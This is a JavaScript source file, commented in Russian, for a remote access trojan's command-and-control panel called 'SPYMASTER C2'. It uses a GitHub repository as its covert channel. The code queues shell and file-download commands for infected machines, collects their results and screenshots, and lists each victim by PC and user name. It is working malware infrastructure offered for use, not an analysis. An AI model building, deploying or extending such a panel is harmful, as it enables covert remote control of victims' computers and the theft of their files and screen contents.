// ============= SPYMASTER C2 PANEL - ПРОСТАЯ РАБОЧАЯ ВЕРСИЯ =============
// АВТОР: КРЫСА ГУБЕРНАТОРСКАЯ

// ============= КОНФИГУРАЦИЯ =============
let GITHUB_USERNAME = "gitnikaaaa";
let GITHUB_REPO = "rat_c2";
let GITHUB_TOKEN = "";

// Загрузка сохранённых данных
try {
    if (typeof CONFIG !== 'undefined') {
        GITHUB_USERNAME = CONFIG.GITHUB_USERNAME || GITHUB_USERNAME;
        GITHUB_TOKEN = CONFIG.GITHUB_TOKEN || "";
    }
} catch(e) {}

if (!GITHUB_TOKEN) {
    const savedToken = localStorage.getItem("github_token");
    if (savedToken) {
        GITHUB_TOKEN = savedToken;
    } else {
        GITHUB_TOKEN = prompt("🔐 ВВЕДИТЕ ТОКЕН GITHUB:");
        if (GITHUB_TOKEN) localStorage.setItem("github_token", GITHUB_TOKEN);
    }
}

if (GITHUB_USERNAME === "твой_логин") {
    const savedUser = localStorage.getItem("github_username");
    if (savedUser) {
        GITHUB_USERNAME = savedUser;
    } else {
        GITHUB_USERNAME = prompt("👤 ВВЕДИТЕ LOGIN GITHUB:");
        if (GITHUB_USERNAME) localStorage.setItem("github_username", GITHUB_USERNAME);
    }
}

// ============= ГЛОБАЛЬНЫЕ ПЕРЕМЕННЫЕ =============
const API_URL = `https://api.github.com/repos/${GITHUB_USERNAME}/${GITHUB_REPO}/contents`;
const HEADERS = {
    "Authorization": `token ${GITHUB_TOKEN}`,
    "Accept": "application/vnd.github.v3+json"
};

let clients = [];
let seenFiles = [];
let autoRefresh = null;
let currentClient = "all";

// ============= ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ =============
function addLog(message, type = "system") {
    const logContainer = document.getElementById("logContainer");
    if (!logContainer) return;
    const time = new Date().toLocaleTimeString();
    const logEntry = document.createElement("div");
    logEntry.className = `log-entry ${type}`;
    logEntry.innerHTML = `<span style="color:#666">[${time}]</span> ${message}`;
    logContainer.insertBefore(logEntry, logContainer.firstChild);
    while (logContainer.children.length > 300) {
        logContainer.removeChild(logContainer.lastChild);
    }
}

function showNotification(message, type = "info") {
    const notification = document.createElement("div");
    notification.style.cssText = `
        position: fixed;
        bottom: 20px;
        right: 20px;
        background: ${type === "success" ? "#00aa00" : type === "error" ? "#aa0000" : "#1a1f4e"};
        color: #fff;
        padding: 10px 20px;
        border-radius: 5px;
        font-family: monospace;
        font-size: 12px;
        z-index: 1000;
        animation: fadeInOut 3s ease;
    `;
    notification.innerText = message;
    document.body.appendChild(notification);
    setTimeout(() => notification.remove(), 3000);
}

// ============= ПРОСТАЯ ОТПРАВКА КОМАНД (РАБОТАЛА ИДЕАЛЬНО) =============
async function sendCommand(command, clientId = null) {
    if (!command) return;
    
    const targetClient = clientId || currentClient || "all";
    let finalCommand = command;
    if (targetClient !== "all") {
        finalCommand = `@${targetClient} ${command}`;
    }
    
    addLog(`📨 ОТПРАВКА: ${finalCommand}`, "system");
    
    try {
        // 1. Получаем текущий commands.txt
        let response = await fetch(`${API_URL}/commands.txt`, { headers: HEADERS });
        
        let currentContent = "";
        let sha = null;
        
        if (response.status === 200) {
            const data = await response.json();
            currentContent = atob(data.content);
            sha = data.sha;
        }
        
        // 2. Добавляем команду (БЕЗ ВСЯКИХ ВРЕМЕННЫХ МЕТОК!)
        const newContent = currentContent + finalCommand + "\n";
        const encodedContent = btoa(unescape(encodeURIComponent(newContent)));
        
        // 3. Отправляем обратно
        const putData = {
            message: `Command: ${command}`,
            content: encodedContent,
            branch: "main"
        };
        if (sha) putData.sha = sha;
        
        const putResponse = await fetch(`${API_URL}/commands.txt`, {
            method: "PUT",
            headers: HEADERS,
            body: JSON.stringify(putData)
        });
        
        if (putResponse.status === 200 || putResponse.status === 201) {
            addLog(`✅ ОТПРАВЛЕНО: ${command}`, "success");
            showNotification(`✅ ${command}`, "success");
        } else {
            addLog(`❌ ОШИБКА: ${putResponse.status}`, "error");
        }
        
    } catch (error) {
        addLog(`❌ ОШИБКА: ${error.message}`, "error");
    }
}

// ============= ЗАГРУЗКА РЕЗУЛЬТАТОВ =============
async function loadResults() {
    try {
        const response = await fetch(API_URL, { headers: HEADERS });
        if (!response.ok) return;
        
        const files = await response.json();
        if (!Array.isArray(files)) return;
        
        const results = files.filter(f => f.name.startsWith("result_"));
        const screenshots = files.filter(f => f.name.startsWith("screenshot_"));
        
        const resultsCount = document.getElementById("resultsCount");
        const screensCount = document.getElementById("screensCount");
        const clientsCount = document.getElementById("clientsCount");
        if (resultsCount) resultsCount.innerText = results.length;
        if (screensCount) screensCount.innerText = screenshots.length;
        if (clientsCount) clientsCount.innerText = clients.length;
        
        // Новые результаты
        for (const file of results) {
            if (!seenFiles.includes(file.name)) {
                seenFiles.push(file.name);
                const content = await fetch(file.download_url).then(r => r.text());
                addLog(`📥 ${file.name}`, "result");
                const lines = content.split('\n').slice(0, 5);
                for (const line of lines) {
                    if (line.trim()) addLog(`   ${line.substring(0, 100)}`, "result");
                }
                
                // Новый клиент?
                if (content.includes("PC:")) {
                    const pcMatch = content.match(/PC:\s*([^\n]+)/);
                    const userMatch = content.match(/User:\s*([^\n]+)/);
                    if (pcMatch && !clients.find(c => c.id === pcMatch[1])) {
                        clients.push({
                            id: pcMatch[1],
                            user: userMatch ? userMatch[1] : "Unknown",
                            firstSeen: new Date().toLocaleString()
                        });
                        updateClientsList();
                        addLog(`💻 НОВЫЙ КЛИЕНТ: ${pcMatch[1]}`, "client");
                        showNotification(`Новый клиент: ${pcMatch[1]}`, "success");
                    }
                }
            }
        }
        
        // Скриншоты
        const grid = document.getElementById("screensGrid");
        if (grid && screenshots.length > 0) {
            grid.innerHTML = "";
            for (const shot of screenshots.slice(-6).reverse()) {
                const card = document.createElement("div");
                card.className = "screenshot-card";
                card.onclick = () => window.open(shot.download_url, '_blank');
                card.innerHTML = `<img src="${shot.download_url}" style="width:100%;height:100px;object-fit:cover"><div style="padding:5px;font-size:10px">${shot.name}</div>`;
                grid.appendChild(card);
            }
        }
        
    } catch (error) {
        addLog(`❌ Ошибка загрузки: ${error.message}`, "error");
    }
}

function updateClientsList() {
    const select = document.getElementById("clientSelect");
    if (!select) return;
    select.innerHTML = '<option value="all">📱 ВСЕ КЛИЕНТЫ</option>';
    for (const client of clients) {
        select.innerHTML += `<option value="${client.id}">🖥️ ${client.id}</option>`;
    }
}

async function clearCommands() {
    try {
        const response = await fetch(`${API_URL}/commands.txt`, { headers: HEADERS });
        if (response.status === 200) {
            const data = await response.json();
            await fetch(`${API_URL}/commands.txt`, {
                method: "PUT",
                headers: HEADERS,
                body: JSON.stringify({
                    message: "Clear commands",
                    content: btoa(""),
                    sha: data.sha,
                    branch: "main"
                })
            });
            addLog("🗑 КОМАНДЫ ОЧИЩЕНЫ", "success");
        }
    } catch (error) {
        addLog(`❌ Ошибка очистки: ${error.message}`, "error");
    }
}

async function testConnection() {
    addLog("🔌 ПРОВЕРКА ПОДКЛЮЧЕНИЯ...", "system");
    try {
        const response = await fetch("https://api.github.com/user", { headers: HEADERS });
        if (response.ok) {
            const user = await response.json();
            addLog(`✅ ПОДКЛЮЧЕНО! ПОЛЬЗОВАТЕЛЬ: ${user.login}`, "success");
            const indicator = document.getElementById("statusIndicator");
            const statusText = document.getElementById("statusText");
            if (indicator) indicator.classList.add("online");
            if (statusText) statusText.innerHTML = `✅ ПОДКЛЮЧЕН | ${user.login}`;
            return true;
        } else {
            addLog(`❌ ОШИБКА: ${response.status}`, "error");
            return false;
        }
    } catch (error) {
        addLog(`❌ ОШИБКА: ${error.message}`, "error");
        return false;
    }
}

function startAutoRefresh() {
    if (autoRefresh) clearInterval(autoRefresh);
    autoRefresh = setInterval(() => loadResults(), 5000);
    addLog("🔄 АВТООБНОВЛЕНИЕ ЗАПУЩЕНО (5 сек)", "system");
}

// ============= ИНИЦИАЛИЗАЦИЯ =============
function init() {
    addLog("🐀 SPYMASTER C2 PANEL v1.0", "system");
    addLog("🐀 АВТОР: КРЫСА ГУБЕРНАТОРСКАЯ", "system");
    
    // Стили
    if (!document.querySelector("#dynamic-styles")) {
        const style = document.createElement('style');
        style.id = "dynamic-styles";
        style.textContent = `
            @keyframes fadeInOut { 0% { opacity: 0; transform: translateX(20px); } 15% { opacity: 1; transform: translateX(0); } 85% { opacity: 1; transform: translateX(0); } 100% { opacity: 0; transform: translateX(20px); } }
            .log-entry.success { border-left-color: #00ff41; color: #00ff41; }
            .log-entry.error { border-left-color: #ff4444; color: #ff8888; }
            .log-entry.system { border-left-color: #ffaa00; color: #ffaa88; }
            .log-entry.client { border-left-color: #00aaff; color: #88ccff; }
            .log-entry.result { border-left-color: #aa44ff; color: #cc88ff; }
            .log-entry { background: #0a0e27; border-radius: 3px; margin-bottom: 5px; padding: 5px 10px; border-left: 3px solid; font-family: monospace; font-size: 12px; }
            .screenshot-card { cursor: pointer; border: 1px solid #00ff41; border-radius: 5px; overflow: hidden; background: #0a0e27; }
            .client-card { cursor: pointer; }
        `;
        document.head.appendChild(style);
    }
    
    testConnection();
    startAutoRefresh();
    loadResults();
    
    // Кнопки
    document.querySelectorAll('.cmd-btn, .cmd-small').forEach(btn => {
        btn.onclick = () => {
            const cmd = btn.getAttribute('data-cmd');
            if (cmd) sendCommand(cmd);
        };
    });
    
    // Кастомная команда
    const sendBtn = document.getElementById('sendCustomBtn');
    if (sendBtn) {
        sendBtn.onclick = () => {
            const input = document.getElementById('customCmd');
            if (input && input.value) {
                sendCommand(input.value);
                input.value = '';
            }
        };
    }
    
    // Download
    const downloadBtn = document.getElementById('downloadBtn');
    if (downloadBtn) {
        downloadBtn.onclick = () => {
            const input = document.getElementById('downloadPath');
            if (input && input.value) {
                sendCommand(`/download ${input.value}`);
            }
        };
    }
    
    // Shell
    const shellBtn = document.getElementById('shellBtn');
    if (shellBtn) {
        shellBtn.onclick = () => {
            const input = document.getElementById('shellCmd');
            if (input && input.value) {
                sendCommand(`/cmd ${input.value}`);
            }
        };
    }
    
    // Очистка команд
    const clearBtn = document.getElementById('clearCommandsBtn');
    if (clearBtn) clearBtn.onclick = () => clearCommands();
    
    // Обновление
    const refreshBtn = document.getElementById('refreshBtn');
    if (refreshBtn) refreshBtn.onclick = () => loadResults();
    
    // Очистка всего
    const clearAllBtn = document.getElementById('clearAllBtn');
    if (clearAllBtn) {
        clearAllBtn.onclick = () => {
            if (confirm("💣 Удалить ВСЕ файлы? Файлы сайта НЕ будут затронуты!")) {
                (async () => {
                    const response = await fetch(API_URL, { headers: HEADERS });
                    if (response.ok) {
                        const files = await response.json();
                        const protectedFiles = ["index.html", "style.css", "script.js", "config.js", ".gitignore"];
                        for (const file of files) {
                            if (protectedFiles.includes(file.name)) continue;
                            await fetch(`${API_URL}/${file.name}`, {
                                method: "DELETE",
                                headers: HEADERS,
                                body: JSON.stringify({ message: "Delete", sha: file.sha, branch: "main" })
                            });
                        }
                        addLog("💣 РЕПОЗИТОРИЙ ОЧИЩЕН", "success");
                        seenFiles = [];
                        clients = [];
                        loadResults();
                    }
                })();
            }
        };
    }
    
    // Выбор клиента
    const clientSelect = document.getElementById('clientSelect');
    if (clientSelect) {
        clientSelect.onchange = (e) => {
            currentClient = e.target.value;
            addLog(`🎯 ВЫБРАН: ${currentClient === "all" ? "ВСЕ КЛИЕНТЫ" : currentClient}`, "system");
        };
    }
    
    // Вкладки
    document.querySelectorAll('.tab-btn').forEach(btn => {
        btn.onclick = () => {
            document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
            document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
            btn.classList.add('active');
            const tab = document.getElementById(`${btn.getAttribute('data-tab')}Tab`);
            if (tab) tab.classList.add('active');
        };
    });
    
    addLog("✅ ГОТОВ К РАБОТЕ", "success");
}

// Запуск
if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", init);
} else {
    init();
}
